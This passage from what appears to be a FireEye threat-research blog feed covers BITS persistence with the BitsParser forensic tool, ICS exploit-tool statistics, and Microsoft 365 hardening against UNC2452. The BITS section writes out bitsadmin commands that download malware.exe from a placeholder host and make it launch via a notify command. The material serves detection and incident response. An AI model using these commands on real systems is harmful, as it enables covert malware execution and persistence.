  than traditional registry locations, it can be overlooked by tools
  that attempt to identify persistence executables and commands or by
  forensic investigators.</p>
 <p>BITS jobs can be created using API function calls or via the
  bitsadmin command line tool. See Figure 1 and Figure 2 for an example
  of how a BITS job can be used to download a file and trigger execution.</p>
 <table cellpadding="0" cellspacing="0" width="100%"> <tbody>
    <tr>
      <td><p>
          <span class="code">&gt; bitsadmin /create download<br />  &gt;
            bitsadmin /addfile download https://&lt;site&gt;/malware.exe
            c:\windows\malware.exe<br />  &gt; bitsadmin /resume
            download<br />  &gt; bitsadmin /complete download</span></p> <p>
          <span class="code">Created job
            {EA8603EB-7CC2-44EC-B1EE-E9923290C2ED}.<br />  Added
            https://&lt;site&gt;/malware.exe -&gt;
            c:\windows\malware.exe to job.<br />  Job resumed.<br />
            Job completed.</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 1: Using bitsadmin to create a job that
    downloads a malicious executable and stores it to c:\windows\malware.exe.</span></p>
 <table cellpadding="0" cellspacing="0" width="100%"> <tbody>
    <tr>
      <td><span class="code">&gt; bitsadmin /create persistence<br />
          &gt; bitsadmin /addfile persistence
          http://127.0.0.1/invalid.exe c:\windows\i.exe<br />  &gt;
          bitsadmin /SetNotifyCmdLine persistence c:\windows\malware.exe
          NULL<br />  &gt; bitsadmin /resume persistence</span></td> </tr></tbody></table>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/back-in-a-bit/Fig2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: Using bitsadmin to create a job
    that will launch malware.exe after attempting to download an invalid URL.</span></p>
 <h4>Creating BitsParser</h4>
 <p>Through our investigations, Mandiant consultants identified evidence
  of attackers leveraging BITS across multiple campaigns. In order to
  search for evidence of attacker use of BITS, we needed to understand
  the underlying infrastructure used by BITS and create a tool that
  could collect relevant information.</p>
 <p>We created <a
  href="https://github.com/fireeye/BitsParser">BitsParser</a>, which
  parses BITS databases and returns information about jobs executed on
  endpoint systems. The tool can be run internally by Mandiant
  consultants via our endpoint agent allowing BITS data to be acquired
  from many hosts across an enterprise. BitsParser has been successfully
  used in many investigations to uncover attacker downloads, uploads,
  and persistence.</p>
 <p>In order to process the custom database format, BitsParser utilizes
  the open source <a
  href="https://github.com/ANSSI-FR/bits_parser">ANSSI-FR</a> library.
  The library allows parsing of both active and deleted entries from
  BITS database files, and it can fully extract relevant information
  from job and file records.</p>
 <h4>The QMGR Database</h4>
 <p>BITS jobs and associated state information are stored in local
  “queue manager” (QMGR) database files in the <span
  class="code">%ALLUSERSPROFILE%\Microsoft\Network\Downloader</span>
  directory. The database is stored to files named qmgr0.dat and
  qmgr1.dat. The two-file scheme appears to be used for back up and
  synchronization purposes. The second file largely contains duplicate
  job and file information, though some unique or older entries can be
  found in the file.</p>
 <h4>Windows 10 Changes</h4>
 <p>The Background Intelligent Transfer Service has largely remained
  unchanged since its introduction. However, Windows 10 introduced
  significant changes to the service, including an all new database
  format. On Windows 10 the QMGR database is stored using the Extensible
  Storage Engine (ESE) format. ESE databases have been used in many
  other Microsoft products including Exchange, Active Directory, and
  Internet Explorer.</p>
 <p>Windows 10 stores the QMGR database in a single file called <span
  class="code">qmgr.db</span>. Separate transaction log files are
  maintained in the same directory. The most recent transaction log is
  stored to a file called <span class="code">edb.log</span>, and three
  older transaction logs with numerical suffixes are typically present.</p>
 <h4>Parsing ESE Databases</h4>
 <p>In order to support investigations on Windows 10 systems, we updated
  the BitsParser tool to support the new QMGR database format. To
  accomplish this, we needed a Python-based ESE database parser.
  Research led us to <a
  href="https://github.com/libyal/libesedb">libesedb</a>, which is a
  full ESE database implementation written in C with a Python wrapper.
  With no other Python options available, we initially used libesedb in
  BitsParser to parse the Windows 10 QMGR database. However, we sought a
  solution that did not rely on native executables and would be more
  compact for improved efficiency in large scale deployments.</p>
 <p>The only pure Python ESE database implementation we identified was
  part of the <a
  href="https://github.com/SecureAuthCorp/impacket">Impacket</a> network
  toolset. Although the source code could perform basic database
  enumeration, it lacked key features, including the ability to process
  long values. Since the QMGR database includes entries large enough to
  require long values, modification of the Impacket implementation was
  required. We adapted the Impacket ESE database parsing code to make it
  more robust and support all features necessary for parsing QMGR
  databases. The full Python solution allows database parsing in a much
  smaller package without the risks and limitations of native code.</p>
 <h4>Database Structure</h4>
 <p>The Windows 10 QMGR database contains two tables: Jobs and Files.
  Both tables have two columns: Id and Blob. The Id contains a GUID to
  identify the entry, and the Blob contains binary data which defines
  the job or file. Fortunately, the job and file structures are largely
  unchanged from the previous database format.</p>
 <p>Job data starts with the control structure:</p>
 <table border="1" cellspacing="0" cellpadding="0" width="300"> <tbody>
    <tr>
      <td width="77" valign="top"><p>
          <b>Offset</b></p> </td> <td width="156" valign="top"><p>
          <b>Field</b></p> </td> <td width="67" valign="top"><p>
          <b>Size</b></p> </td> </tr>
    <tr>
      <td width="77" valign="top"><p>0</p> </td> <td width="156"
        valign="top"><p>Type</p> </td> <td width="67"
        valign="top"><p>4</p> </td> </tr>
    <tr>
      <td width="77" valign="top"><p>4</p> </td> <td width="156"
        valign="top"><p>Priority</p> </td> <td width="67"
        valign="top"><p>4</p> </td> </tr>
    <tr>
      <td width="77" valign="top"><p>8</p> </td> <td width="156"
        valign="top"><p>State</p> </td> <td width="67"
        valign="top"><p>4</p> </td> </tr>
    <tr>
      <td width="77" valign="top"><p>...</p> </td> <td width="156"
        valign="top"><p> </p> </td> <td width="67" valign="top"><p> </p>
      </td> </tr>
    <tr>
      <td width="77" valign="top"><p>16</p> </td> <td width="156"
          valign="top"><p>Job ID (GUID)</p> </td> <td width="67"
        valign="top"><p>16</p> </td> </tr>
    <tr>
      <td width="77" valign="top"><p>32</p> </td> <td width="156"
          valign="top"><p>Name (UTF-16)</p> </td> <td width="67"
        valign="top"><p>variable</p> </td> </tr>
    <tr>
      <td width="77" valign="top"><p>variable</p> </td> <td width="156"
          valign="top"><p>Description (UTF-16)</p> </td> <td width="67"
        valign="top"><p>variable</p> </td> </tr>
    <tr>
      <td width="77" valign="top"><p>variable</p> </td> <td width="156"
          valign="top"><p>Command (UTF-16)</p> </td> <td width="67"
        valign="top"><p>variable</p> </td> </tr>
    <tr>
      <td width="77" valign="top"><p>variable</p> </td> <td width="156"
          valign="top"><p>Arguments (UTF-16)</p> </td> <td width="67"
        valign="top"><p>variable</p> </td> </tr>
    <tr>
      <td width="77" valign="top"><p>variable</p> </td> <td width="156"
          valign="top"><p>User SID (UTF-16)</p> </td> <td width="67"
        valign="top"><p>variable</p> </td> </tr>
    <tr>
      <td width="77" valign="top"><p>variable</p> </td> <td width="156"
        valign="top"><p>Flags</p> </td> <td width="67"
        valign="top"><p>4</p> </td> </tr></tbody></table>
 <p>Following the control structure is a list of files delimited by the
  XFER GUID, {7756DA36-516F-435A-ACAC-44A248FFF34D}. The list begins
  with a 4-byte file count followed by a list of GUIDs, which correspond
  to Id values in the Files table.</p>
 <p>The file data uses the following structure:</p>
 <table border="1" cellspacing="0" cellpadding="0" width="282"> <tbody>
    <tr>
      <td width="215" valign="top"><p>
          <b>Field</b></p> </td> <td width="67" valign="top"><p>
          <b>Size</b></p> </td> </tr>
    <tr>
      <td width="215" valign="top"><p>Destination Filename (UTF-16)</p>
      </td> <td width="67" valign="top"><p>variable</p> </td> </tr>
    <tr>
      <td width="215" valign="top"><p>Source Filename (UTF-16)</p> </td>
        <td width="67" valign="top"><p>variable</p> </td> </tr>
    <tr>
      <td width="215" valign="top"><p>Temporary Filename (UTF-16)</p>
      </td> <td width="67" valign="top"><p>variable</p> </td> </tr>
    <tr>
      <td width="215" valign="top"><p>Download Size</p> </td> <td
        width="67" valign="top"><p>8</p> </td> </tr>
    <tr>
      <td width="215" valign="top"><p>Transfer Size</p> </td> <td
        width="67" valign="top"><p>8</p> </td> </tr>
    <tr>
      <td width="215" valign="top"><p>
          <i>unknown</i></p> </td> <td width="67" valign="top"><p>1</p>
      </td> </tr>
    <tr>
      <td width="215" valign="top"><p>Drive (UTF-16)</p> </td> <td
        width="67" valign="top"><p>variable</p> </td> </tr>
    <tr>
      <td width="215" valign="top"><p>Volume GUID (UTF-16)</p> </td> <td
        width="67" valign="top"><p>variable</p> </td> </tr></tbody></table>
 <p>The database is processed by enumerating entries in the Jobs table,
  parsing each job data, finding correlated files, and parsing the
  corresponding records in the Files table. This allows the BitsParser
  to combine related information and output jobs with their associated
  files including relevant metadata.</p>
 <h4>Recovering Deleted Records</h4>
 <p>Active jobs have entries in the Jobs and Files tables. Records are
  deleted upon job completion or cancellation. As with other filesystem
  and data formats, deleted entries are not immediately overwritten and
  can often be recovered for some time after deletion.</p>
 <p>The following algorithm is used to recover deleted jobs and files
  from Windows 10 QMGR databases:</p>
 <ol> <li>Locate file records by searching for the file identifier GUID,
    {519ECFE4-D946-4397-B73E-268513051AB2}. Attempt to parse the
    following data as a normal file record.</li> <li>Locate job records
    by searching for job identifier GUIDs. Attempt to parse the
    following data as a normal job record. Handle incomplete job entries
    by parsing just the control structure and manually locate associated
    files if required.<br /> The following job GUIDs have been observed
    in QMGR databases:<ol>
      <li>{E10956A1-AF43-42C9-92E6-6F9856EBA7F6}</li>
      <li>{4CD4959F-7064-4BF2-84D7-476A7E62699F}</li>
      <li>{A92619F1-0332-4CBF-9427-898818958831}</li>
      <li>{DDBC33C1-5AFB-4DAF-B8A1-2268B39D01AD}</li>
      <li>{8F5657D0-012C-4E3E-AD2C-F4A5D7656FAF}</li>
      <li>{94416750-0357-461D-A4CC-5DD9990706E4}</li> </ol> </li>
    <li>Correlate carved file records to carved jobs. Process all
    remaining carved file records that could not be correlated to active
    or deleted jobs.</li> </ol>
 <p>Historic records can also be found in transaction log files.
  Although we do not parse the transaction log structures, the same
  algorithm can be used to find job and file records within the logs by
  searching for appropriate GUIDs. While the same records may be present
  in multiple files, duplicates can be suppressed to prevent output of
  redundant information.</p>
 <h4>BitsParser Tool Release</h4>
 <p>At the time of writing we are not aware of any open source tools
  available to parse BITS databases and extract data useful for incident
  response and forensic investigations. To help address this and foster
  further research, FireEye has decided to release a standalone version
  of BitsParser. This command line utility can process all versions of
  BITS databases and perform carving to recover deleted job and file information.</p>
 <p>Source code for BitsParser can be found at our <a
    href="https://github.com/fireeye/BitsParser">GitHub page</a>.</p>
 <p>Note that on Windows 10 the QMGR database files are opened without
  sharing by the BITS service thus preventing other programs from
  directly opening them. When BitsParser is deployed via the FireEye
  endpoint agent it can directly parse the local filesystem and raw read
  files in circumstances where they cannot be directly read. The
  standalone BitsParser does not have this ability. The BITS service
  should be stopped prior to running BitsParser or third-party tools for
  copying locked files may be utilized.</p>
 <h4>BITS Persistence in the Wild</h4>
 <p>In 2020 Mandiant responded to many incidents involving Ryuk
  ransomware operators leveraging custom backdoors and loaders to
  actively target hospitals and other medical support centers (see our
  blog post <a
    href="/content/fireeye-www/en_US/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html">Unhappy
    Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser</a>).
  Through numerous engagements Mandiant was able to profile the
  attacker's Tools Techniques and Procedures (TTPs) and identify unique
  aspects of the various backdoors and loaders that were leveraged prior
  to encryption. In one such engagement, Mandiant consultants had mapped
  the vast majority of the attack timeline from initial exploitation to
  the encryption of corporate resources and an extortion demand. Log
  analysis and telemetry provided by the customer's on-premises endpoint
  detection solution led to the identification of a KEGTAP backdoor on
  an end-user workstation. Mandiant was able to identify the specific
  email and lure used by the ransomware operators including the download
  and execution of the file <span class="code">mail.exe</span>, which
  launched KEGTAP. However, none of the persistence mechanisms that
  Mandiant observed in other engagements were present on this endpoint.</p>
 <p>A full understanding of the persistence mechanism would allow
  Mandiant to hunt for additional evidence of attacker activity across
  the environment and in other engagements. As focus intensified,
  Mandiant consultants identified evidence to indicate that the BITS
  service launched the KEGTAP backdoor. Analysts identified entries in
  the Microsoft-Windows-Bits-Client operational event log which
  associated the BITS service activity with the file <span class="code">mail.exe</span>.</p>
 <table cellpadding="0" cellspacing="0" width="100%"> <tbody>
    <tr>
      <td><p>
          <span class="code">3 | Information | The BITS service created
            a new job: System update, with owner REDACTED</span></p> <p>
          <span class="code">61 | Warning | BITS stopped transferring
            the System update transfer job that is associated with the
            http://127.0.0.1/tst/56/ URL. The status code is
        2147954429.  </span></p> <p>
          <span class="code">64 | Warning | The BITS job System update
            is configured to launch
            C:\Users\REDACTED\AppData\Local\Microsoft\Windows\INetCache\IE\REDACTED\mail.exe
            after transfer of http://127.0.0.1/tst/12/. The service
            failed to launch the program with error 2147942402, BITS
            will continue trying to launch the program periodically
            until it succeeds.  </span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 3: Event log entries showing the creation
    of a BITS job for persistence</span></p>
 <p>Mandiant consultants were able to confirm the details of the BITS
  job by interacting with the host and examining the QMGR database. The
  malicious BITS job was set to attempt an HTTP transfer of a
  nonexistent file from the local host. As this file would never exist,
  BITS would trigger the error state and launch the notify command,
  which in this case was KEGTAP.</p>
 <p>Unfortunately, while this was successful in identifying a previously
  unknown persistence mechanism associated with this threat group,
  manual QMGR database analysis would not scale across multiple systems
  or environments. Adapting the existing BitsParser to parse the Windows
  10 version of the QMGR database enabled Mandiant consultants to
  efficiently identify additional infected systems across multiple environments.</p>
 <table cellpadding="0" cellspacing="0" width="100%"> <tbody>
    <tr>
      <td><span class="code">{<br />      &quot;JobType&quot;:
          &quot;download&quot;,<br />      &quot;JobPriority&quot;:
          &quot;normal&quot;,<br />      &quot;JobState&quot;:
          &quot;queued&quot;,<br />      &quot;JobName&quot;:
          &quot;System update&quot;,<br />     
          &quot;CommandExecuted&quot;:
          &quot;C:\\Users\\REDACTED\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\REDACTED\\mail.exe&quot;,<br />
              &quot;Files&quot;: [<br />          {<br />             
          &quot;DestFile&quot;:
          &quot;C:\\Users\\REDACTED\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\REDACTED\\mail.exe&quot;,<br />
                      &quot;SourceURL&quot;:
          &quot;http://127.0.0.1/tst/56/&quot;,<br />             
          &quot;DownloadByteSize&quot;: 0<br />          }<br />     
          ]<br />  }</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 4: BitsParser output shows the malicious
    BITS job launching mail.exe</span></p>
 <h4>Conclusion</h4>
 <p>The Background Intelligent Transfer Service continues to provide
  utility to applications and attackers alike. The BITS QMGR database
  can present a useful source of data in an investigation or hunting
  operation. <a
  href="https://github.com/fireeye/BitsParser">BitsParser</a> may be
  utilized with other forensic tools to develop a detailed view of
  attacker activity.</p>
http://www.fireeye.com/blog/threat-research/2021/03/attacker-use-of-windows-background-intelligent-transfer-service.html2021-03-31T15:00:00.000Z2021-03-31T14:57:26.674ZMonitoring ICS Cyber Operation Tools and Software Exploit Modules To
Anticipate Future Threatsnoemail@noemail.orgJeffrey Ashcraft<p>There has only been a small number of broadly documented cyber
  attacks targeting operational technologies (OT) / industrial control
  systems (ICS) over the last decade. While fewer attacks is clearly a
  good thing, the lack of an adequate sample size to determine risk
  thresholds can make it difficult for defenders to understand the
  threat environment, prioritize security efforts, and justify resource allocation.</p>
 <p>To address this problem, FireEye <a
    href="/content/fireeye-www/en_US/mandiant/threat-intelligence.html">Mandiant
    Threat Intelligence</a> produces a range of reports for <a
  href="https://www.fireeye.com/content/dam/fireeye-www/products/pdfs/pf/intel/ds-cyber-physical-threat-intelligence.pdf">subscription</a>
  customers that focus on different indicators to predict future
  threats. Insights from activity on dark web forums, anecdotes from the
  field, ICS vulnerability research, and proof of concept research makes
  it possible to illustrate the threat landscape even with limited
  incident data. This blog post focuses on one of those source
  sets—ICS-oriented intrusion and attack tools, which will be referred
  to together in this post as cyber operation tools.</p>
 <p>ICS-oriented cyber operation tools refer to hardware and software
  that has the capability to either exploit weaknesses in ICS, or
  interact with the equipment in such a way that could be utilized by
  threat actors to support intrusions or attacks. For this blog post, we
  separated exploit modules that are developed to run on top of
  frameworks such as <a
  href="https://www.metasploit.com/">Metasploit</a>, <a
    href="https://www.coresecurity.com/core-impact">Core Impact</a>, or
    <a
    href="https://www.immunityinc.com/products/canvas/gleg-products.html">Immunity
  Canvas</a> from other cyber operation tools due to their exceedingly
  high number.</p>
 <h4>Cyber Operation Tools Reduce the Level of Specialized Knowledge
  Attackers Need to Target ICS</h4>
 <p>As ICS are a distinct sub-domain to information and computer
  technology, successful intrusions and attacks against these systems
  often requires specialized knowledge, establishing a higher threshold
  for successful attacks. Since intrusion and attack tools are often
  developed by someone who already has the expertise, these tools can
  help threat actors bypass the need for gaining some of this expertise
  themselves, or it can help them gain the requisite knowledge more
  quickly. Alternatively, experienced actors may resort to using known
  tools and exploits to conceal their identity or maximize their budget.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/icstools/Picture1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: ICS attacker knowledge curve</span></p>
 <p>The development and subsequent adoption of standardized cyber
  operation tools is a general indication of increasing adversarial
  capability. Whether these tools were developed by researchers as
  proof-of-concept or utilized during past incidents, access to them
  lowers the barrier for a variety of actors to learn and develop future
  skills or custom attack frameworks. Following this premise, equipment
  that is vulnerable to exploits using known cyber operation tools
  becomes low-hanging fruit for all sorts of attackers.</p>
 <h4>ICS Cyber Operation Tool Classification</h4>
 <p>Mandiant Intelligence tracks a large number of publicly available
  ICS-specific cyber operation tools. The term &quot;ICS-specific,&quot;
  as we employ it, does not have a hard-edged definition. While the vast
  majority of cyber operation tools we track are clear-cut cases, we
  have, in some instances, considered the intent of the tool's
  creator(s) and the tool's reasonably foreseeable impact on ICS
  software and equipment. Note, we excluded tools that are IT-based but
  may affect OT systems, such as commodity malware or known network
  utilities.  We included only a few exceptions, where we identified
  specialized adaptations or features that enabled the tool to interact
  with ICS, such as the case of nmap scripts.</p>
 <p>We assigned each tool to at least one of eight different categories
  or classes, based on functionality.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/icstools/Picture2.png" alt="" />
  <br /> <span class="type-XS">Table 1: Classes of ICS-specific
    intrusion and attack tools</span></p>
 <p>While some of the tools included in our list were created as early
  as 2004, most of the development has taken place during the last 10
  years. The majority of the tools are also vendor agnostic, or
  developed to target products from some of the largest ICS original
  equipment manufacturers (OEM). Siemens stands out in this area, with
  60 percent of the vendor-specific tools potentially targeting its
  products. Other tools we identified were developed to target products
  from Schneider Electric, GE, ABB, Digi International, Rockwell
  Automation, and Wind River Systems.</p>
 <p>Figure 2 depicts the number of tools by class. Of note, network
  discovery tools make up more than a quarter of the tools. We also
  highlight that in some cases, the software exploitation tools we track
  host extended repositories of modules to target specific products or vulnerabilities.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/icstools/Picture3.png" alt="" />
  <br /> <span class="type-XS">Figure 2: ICS-specific intrusion and
    attack tools by class</span></p>
 <h4>Software Exploit Modules</h4>
 <p>Software exploit modules are the most numerous subcomponents of
  cyber operation tools given their overall simplicity and
  accessibility. Most frequently, exploit modules are developed to take
  advantage of a specific vulnerability and automate the exploitation
  process. The module is then added to an exploit framework. The
  framework works as a repository that may contain hundreds of modules
  for targeting a wide variety of vulnerabilities, networks, and
  devices. The most popular frameworks include <a
  href="https://www.metasploit.com/">Metasploit</a>, <a
    href="https://www.coresecurity.com/core-impact">Core Impact</a>, and
    <a
    href="https://www.immunityinc.com/products/canvas/gleg-products.html">Immunity
  Canvas</a>. Also, since 2017, we have identified the development of
  younger ICS-specific exploit frameworks such as <a
    href="https://github.com/NullArray/AutoSploit">Autosploit</a>, <a
    href="https://github.com/dark-lbp/isf">Industrial Exploitation
  Framework</a> (ICSSPLOIT), and the <a
    href="https://github.com/w3h/isf">Industrial Security Exploitation Framework</a>.</p>
 <p>Given the simplicity and accessibility of exploit modules, they are
  attractive to actors with a variety of skill levels. Even less
  sophisticated actors may take advantage of an exploit module without
  completely understanding how a vulnerability works or knowing each of
  the commands required to exploit it. We note that, although most of
  the exploit modules we track were likely developed for research and
  penetration testing, they could also be utilized throughout the attack lifecycle.</p>
 <p>
  <i>Exploit Modules Statistics</i></p>
 <p>Since 2010, Mandiant Intelligence has tracked exploit modules for
  the three major exploitation frameworks: <a
  href="https://www.metasploit.com/">Metasploit</a>, <a
    href="https://www.coresecurity.com/core-impact">Core Impact</a>, and
    <a
    href="https://www.immunityinc.com/products/canvas/gleg-products.html">Immunity
  Canvas</a>. We currently track hundreds of ICS-specific exploit
  modules related to more than 500 total vulnerabilities, 71 percent of
  them being potential zero-days. The break down is depicted in Figure
  3. Immunity Canvas currently has the most exploits due in large part
  to the efforts of Russian security research firm <a href="http://www.gleg.net/">GLEG</a>.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/icstools/Picture4b.jpg" alt="" />
  <br /> <span class="type-XS">Figure 3: ICS exploit modules by framework</span></p>
 <p>Metasploit framework exploit modules deserve particular attention.
  Even though it has the fewest number of modules, Metasploit is freely
  available and broadly used for IT penetration testing, while Core
  Impact and Immunity Canvas are both commercial tools. This makes
  Metasploit the most accessible of the three frameworks. However, it
  means that module development and maintenance are provided by the
  community, which is likely contributing to the lower number of modules.</p>
 <p>It is also worthwhile to examine the number of exploit modules by
  ICS product vendor. The results of this analysis are depicted in
  Figure 4, which displays vendors with the highest number of exploit
  modules (over 10).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/icstools/Picture5.png" alt="" />
  <br /> <span class="type-XS">Figure 4: Vendors with 10 exploit modules
    or more</span></p>
 <p>Figure 4 does not necessarily indicate which vendors are the most
  targeted, but which products have received the most attention from
  exploit writers. Several factors could contribute to this, including
  the availability of software to experiment with, general ease of
  writing an exploit on particular vulnerabilities, or how the
  vulnerability matches against the expertise of the exploit writers.</p>
 <p>Some of the vendors included in the graph have been acquired by
  other companies, however we tracked them separately as the
  vulnerability was identified prior to the acquisition. One example of
  this is Schneider Electric, which acquired 7-Technologies in 2011 and
  altered the names of their product portfolio. We also highlight that
  the graph solely counts exploit modules, regardless of the
  vulnerability exploited. Modules from separate frameworks could target
  the same vulnerability and would each be counted separately.</p>
 <h4>ICS Cyber Operation Tools and Software Exploitation Frameworks
  Bridge Knowledge and Expertise Gaps</h4>
 <p>ICS-specific cyber operation tools often released by researchers and
  security practitioners are useful assets to help organizations learn
  about ongoing threats and product vulnerabilities. However, as
  anything publicly available, they can also lower the bar for threat
  actors that hold an interest in targeting OT networks. Although
  successful attacks against OT environments will normally require a
  high level of skills and expertise from threat actors, the tools and
  exploit modules discussed in this post are making it easier to bridge
  the knowledge gap.</p>
 <p>Awareness about the proliferation of ICS cyber operation tools
  should serve as an important risk indicator of the evolving threat
  landscape. These tools provide defenders with an opportunity to
  perform risk assessments in test environments and to leverage
  aggregated data to communicate and obtain support from company
  executives. Organizations that do not pay attention to available ICS
  cyber operation tools risk becoming low-hanging fruit for both
  sophisticated and unexperienced threat actors exploring new capabilities.</p>
 <p>FireEye Intelligence customers have access to the full list and
  analysis of ICS cyber operation tools and exploit modules. Visit our
  website to learn more about the <a
    href="https://www.fireeye.com/content/dam/fireeye-www/products/pdfs/pf/intel/ds-cyber-physical-threat-intelligence.pdf">FireEye
    Mandiant Cyber Physical Threat Intelligence subscription</a>.</p>
http://www.fireeye.com/blog/threat-research/2020/03/monitoring-ics-cyber-operation-tools-and-software-exploit-modules.html2020-03-23T12:00:00.000Z2021-03-30T15:55:09.196ZRemediation and Hardening Strategies for Microsoft 365 to Defend Against UNC2452noemail@noemail.orgMike Burns<p>
  <i>UPDATE (Mar. 18): Mandiant recently observed targeted threat actors
    modifying mailbox folder permissions of user mailboxes to maintain
    persistent access to the targeted users' email messages. This
    stealthy technique is not usually monitored by defenders and
    provides threat actors a way to access the desired email messages
    using any compromised credentials. The white paper, blog post and
    Azure AD Investigator tool have been updated to reflect these
    findings. Mandiant would like to thank the members of Microsoft’s
    Detection and Response Team (DART) for their collaboration on this research.</i></p>
 <p>In December 2020, FireEye uncovered and publicly disclosed a
  widespread attacker campaign that is being tracked as <a
  href="/content/fireeye-www/en_US/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html">UNC2452</a>.
  In some, but not all, of the intrusions associated with this campaign
  where Mandiant has visibility, the attacker used their access to
  on-premises networks to gain unauthorized access to the victim’s
  Microsoft 365 environment.</p>
 <h4>Goals and Objectives</h4>
 <p>Methodologies that UNC2452 and other threat actors have used to move
  laterally from on-premises networks to the Microsoft 365 cloud have
  been detailed in our white paper, <i>
    <a href="/content/dam/collateral/en/wp-m-unc2452.pdf"
      target="_blank">Remediation and Hardening Strategies for Microsoft
      365 to Defend Against UNC2452</a></i>. The paper also discusses
  how organizations can proactively harden their environments and
  remediate environments where similar techniques have been observed.</p>
 <p>Mandiant is releasing an auditing script, <a
    href="https://github.com/fireeye/Mandiant-Azure-AD-Investigator">Azure
    AD Investigator</a>, through its GitHub repository that
  organizations can use to check their Microsoft 365 tenants for
  indicators of some of the techniques used by UNC2452. The script will
  alert administrators and security practitioners to artifacts that may
  require further review to determine if they are truly malicious or
  part of legitimate activity. Many of the attacker techniques detailed
  in the white paper are dual-use in nature—they can be used by threat
  actors but also by legitimate tools. Therefore, a detailed review for
  specific configuration parameters may be warranted, including
  correlating and verifying that configurations are aligned with
  authorized and expected activities.</p>
 <h4>Attacker Tactics, Techniques and Procedures (TTPs)</h4>
 <p>Mandiant has observed UNC2452 and other threat actors moving
  laterally to the Microsoft 365 cloud using a combination of four
  primary techniques:</p>
 <ol> <li>Steal the Active Directory Federation Services (AD FS)
    token-signing certificate and use it to forge tokens for arbitrary
    users (sometimes described as <a
      href="https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps">Golden
    SAML</a>). This would allow the attacker to authenticate into a
    federated resource provider (such as Microsoft 365) as any user,
    without the need for that user’s password or their corresponding
    multi-factor authentication (MFA) mechanism.</li> <li>Modify or add
    trusted domains in Azure AD to add a new federated Identity Provider
    (IdP) that the attacker controls. This would allow the attacker to
    forge tokens for arbitrary users and has been described as an <a
      href="https://o365blog.com/post/aadbackdoor/">Azure AD</a> <a
  href="/content/fireeye-www/en_US/blog/threat-research/2020/09/detecting-microsoft-365-azure-active-directory-backdoors.html">backdoor</a>.</li>
    <li>Compromise the credentials of on-premises user accounts that are
    synchronized to Microsoft 365 that have high privileged directory
    roles, such as Global Administrator or Application
  Administrator.</li> <li>
    <a
    href="https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/">Backdoor</a>
    an existing Microsoft 365 application by adding a new application or
    service principal credential in order to use the legitimate
    permissions assigned to the application, such as the ability to read
    email, send email as an arbitrary user, access user calendars,
  etc.</li> <li>Modify the permissions of folders in a victim mailbox
    (such as the inbox) to make its contents readable by any other user
    in the victim’s Microsoft 365 environment.</li> </ol>
 <p>Read the <a href="/content/dam/collateral/en/wp-m-unc2452.pdf"
    target="_blank">white paper</a> for a detailed overview of each
  technique, including practical remediation and hardening strategies,
  and check out our auditing script, <a
    href="https://github.com/fireeye/Mandiant-Azure-AD-Investigator">Azure
    AD Investigator</a>.  </p>
 <h4>Detections</h4>
 <table border="1" cellspacing="0" cellpadding="0" width="660"> <tbody>
    <tr>
      <td width="264" valign="top"><p>
          <b>FireEye Helix Detection</b></p> </td> <td width="209" valign="top"><p>
          <b>MITRE Technique</b></p> </td> <td width="186" valign="top"><p>
          <b>Detection Logic</b></p> </td> </tr>
    <tr>
      <td width="264" valign="top"><p>MICROSOFT AZURE ACTIVE DIRECTORY
          [Risky Sign-In]</p> </td> <td width="209" valign="top"><p>
          <a
        href="https://attack.mitre.org/techniques/T1078/004/">T1078.004</a></p>
      </td> <td width="186" valign="top"><p>Alert on suspicious logon
          activity as detected by Azure Identity Protection</p> </td> </tr>
    <tr>
      <td width="264" valign="top"><p>OFFICE 365 [Federated Domain
        Set]</p> </td> <td width="209" valign="top"><p>
          <a
        href="https://attack.mitre.org/techniques/T1550/">T1550</a></p>
      </td> <td width="186" valign="top"><p>Alert on new domain
          federation in Office 365</p> </td> </tr>
    <tr>
      <td width="264" valign="top"><p>OFFICE 365 [Modified Domain
          Federation Settings]</p> <p> </p> </td> <td width="209" valign="top"><p>
          <a
        href="https://attack.mitre.org/techniques/T1550/">T1550</a></p>
      </td> <td width="186" valign="top"><p>Alert of modification to
          domain federations settings in Office 365</p> </td> </tr>
    <tr>
      <td width="264" valign="top"><p>OFFICE 365 [User Added Credentials
          to Service Principal]</p> </td> <td width="209" valign="top"><p>
          <a
        href="https://attack.mitre.org/techniques/T1098/001/">T1098.011</a></p>
      </td> <td width="186" valign="top"><p>Alert on addition of
          certificates or passwords added to Service Principals</p>
      </td> </tr>
    <tr>
      <td width="264" valign="top"><p>OFFICE 365 ANALYTICS [Abnormal
        Logon]</p> <p> </p> </td> <td width="209" valign="top"><p>
          <a
        href="https://attack.mitre.org/techniques/T1078/004/">T1078.004</a></p>
      </td> <td width="186" valign="top"><p>Alert on suspicious login
          activity based on heuristics</p> </td> </tr>
    <tr>
      <td width="264" valign="top"><p>WINDOWS METHODOLOGY [ADFS
        Dump]</p> </td> <td width="209" valign="top"><p>
          <a
        href="https://attack.mitre.org/tactics/TA0006/">TA0006</a></p> <p>
          <a
        href="https://attack.mitre.org/techniques/T1552/">T1552</a></p> <p>
          <a
        href="https://attack.mitre.org/techniques/T1552/004/">T1552.004</a></p> <p>
          <a
        href="https://attack.mitre.org/techniques/T1199/">T1199</a></p>
      </td> <td width="186" valign="top"><p>Alert on activity access
          requests for the AD FS Distributed Key Manager (DKM) container
          in Active Directory</p> </td> </tr>
    <tr>
